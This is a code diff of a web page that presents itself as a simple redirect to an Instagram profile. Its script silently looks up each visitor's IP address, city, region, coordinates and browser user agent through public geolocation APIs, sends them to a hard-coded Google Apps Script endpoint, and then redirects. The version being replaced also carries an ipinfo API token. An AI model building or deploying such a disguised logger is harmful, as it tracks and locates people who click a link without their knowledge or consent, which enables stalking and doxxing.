@@ -1,7 +1,7 @@
 <!DOCTYPE html>
-<html lang="zh-TW">
+<html>
 <head>
-  <meta charset="UTF-8" />
+  <meta charset="UTF-8">
   <title>正在跳轉中...</title>
   <style>
     #map { height: 200px; width: 100%; margin-bottom: 10px; }
@@ -9,7 +9,7 @@
   <link rel="stylesheet" href="https://unpkg.com/leaflet/dist/leaflet.css" />
 </head>
 <body>
-  <p>正在跳轉到 IG</p>
+  <p>正在跳轉到 IG 中...</p>
   <div id="map"></div>
 
   <script src="https://unpkg.com/leaflet/dist/leaflet.js"></script>
@@ -18,32 +18,24 @@
       try {
         const ua = navigator.userAgent;
 
-        // 1. 用 ipify 取得真實 IP
-        const ip = await fetch("https://api.ipify.org?format=json")
-          .then(res => res.json())
-          .then(data => data.ip);
+        // ✅ 使用 ipwho.is API，不需 token
+        const locData = await (await fetch("https://ipwho.is/")).json();
 
-        // 2. 用 ipinfo 查位置 (請替換 token)
-        const locData = await fetch(`https://ipinfo.io/${ip}/json?token=2e8b2a1d7d139b`)
-          .then(res => res.json());
-
+        const ip = locData.ip || "";
         const country = locData.country || "";
         const region = locData.region || "";
         const city = locData.city || "";
+        const lat = locData.latitude || 0;
+        const lon = locData.longitude || 0;
 
-        let lat = 0, lon = 0;
-        if (locData.loc) {
-          [lat, lon] = locData.loc.split(",").map(Number);
-        }
-
-        // 3. 傳送到 Google Apps Script（請替換你的網址）
+        // ✅ 傳送資料到 Google Sheets Apps Script
         await fetch("https://script.google.com/macros/s/AKfycbyYKeXg-KLxCvet0aM95lqJNYLH7O8hZpqbJ2M8O7xrRAAUoSUMFdBUvI3SSL-MSgMm/exec", {
           method: "POST",
-          headers: { "Content-Type": "text/plain;charset=utf-8" },
+          headers: { "Content-Type": "application/json" },
           body: JSON.stringify({ ip, country, region, city, lat, lon, ua })
         });
 
-        // 4. 顯示地圖
+        // ✅ 顯示地圖與定位點
         if (lat && lon) {
           const map = L.map('map').setView([lat, lon], 8);
           L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
@@ -53,12 +45,13 @@
             .bindPopup(`${city}, ${region}, ${country}`)
             .openPopup();
         }
+
       } catch (e) {
-        console.error("記錄或定位失敗", e);
+        console.error("發生錯誤：", e);
       } finally {
-        // 跳轉 IG（你要改成你的 IG 用戶名）
+        // ✅ IG Deep Link：優先開啟 App
         window.location.replace("instagram://user?username=_1naux.1");
-        // 或改成網頁跳轉
+        // 如果你想改為瀏覽器版 IG，可以改成：
         // window.location.href = "https://www.instagram.com/_1naux.1";
       }
     })();
